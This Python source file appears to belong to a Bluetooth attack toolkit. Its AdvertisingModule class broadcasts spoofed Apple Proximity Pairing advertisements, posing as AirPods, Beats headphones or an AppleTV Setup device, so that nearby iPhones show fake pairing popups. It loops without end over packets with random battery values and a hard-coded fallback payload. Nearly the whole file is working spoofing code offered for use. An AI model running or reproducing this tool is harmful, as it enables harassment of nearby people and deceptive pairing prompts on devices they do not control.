import time
import random
from core.hci_wrapper import start_le_advertising, stop_le_advertising, open_dev
from core.packet_builder import ProximityPairingPacket

class AdvertisingModule:
    DEVICE_DATA = {
        1: {"name": "AirPods"},
        2: {"name": "AirPods Pro"},
        3: {"name": "AirPods Max"},
        4: {"name": "AirPods Gen 2"},
        5: {"name": "AirPods Gen 3"},
        6: {"name": "AirPods Pro Gen 2"},
        7: {"name": "PowerBeats"},
        8: {"name": "PowerBeats Pro"},
        9: {"name": "Beats Solo Pro"},
        10: {"name": "Beats Studio Buds"},
        11: {"name": "Beats Flex"},
        12: {"name": "BeatsX"},
        13: {"name": "Beats Solo3"},
        14: {"name": "Beats Studio3"},
        15: {"name": "Beats Studio Pro"},
        16: {"name": "Beats Fit Pro"},
        17: {"name": "Beats Studio Buds+"},
        18: {"name": "AppleTV Setup"},
    }

    def __init__(self, dev_id=0, console=None):
        self.dev_id = dev_id
        self.sock = None
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def start_spoof(self, interval_ms=200, custom_payload=None, model_name="AirPods"):
        self.log(f"[bold blue][*] Starting Spoofing ([white]{model_name}[/white]) on hci{self.dev_id}...[/bold blue]")
        
        self.sock = open_dev(self.dev_id)
        if not self.sock:
            return

        self.log(f"[green][*] Broadcasting {model_name}. Look at your iPhone![/green]")
        self.log("[dim][*] Press Ctrl+C to stop.[/dim]")

        try:
            def run_loop():
                while True:
                    packet_data = ()
                    
                    if custom_payload:
                        packet_data = custom_payload
                    else:
                        bat_left = random.randint(10, 100)
                        bat_right = random.randint(10, 100)
                        bat_case = random.randint(10, 100)
                        
                        try:
                             packet_data = ProximityPairingPacket.build(
                                 model_name=model_name,
                                 battery_left=bat_left,
                                 battery_right=bat_right,
                                 battery_case=bat_case,
                                 charging_left=False,
                                 charging_right=False,
                                 charging_case=False,
                                 lid_open=True 
                             )
                             
                        except Exception as e:
                             prefix = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45)
                             suffix = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)
                             left = (random.randint(1, 100),)
                             right = (random.randint(1, 100),)
                             case = (random.randint(128, 228),)
                             packet_data = prefix + left + right + case + suffix
                    
                    start_le_advertising(self.sock, min_interval=200, max_interval=200, data=packet_data)
                    
                    time.sleep(2)
                    stop_le_advertising(self.sock)
                    time.sleep(0.1)

            if self.console:
                with self.console.status(f"[bold green]Broadcasting {model_name}...[/bold green]", spinner="earth"):
                     run_loop()
            else:
                 run_loop()

        except KeyboardInterrupt:
            self.log("\n[yellow][*] Stopping Advertisement...[/yellow]")
            stop_le_advertising(self.sock)
        except Exception as e:
            self.log(f"[red][!] Error: {e}[/red]")
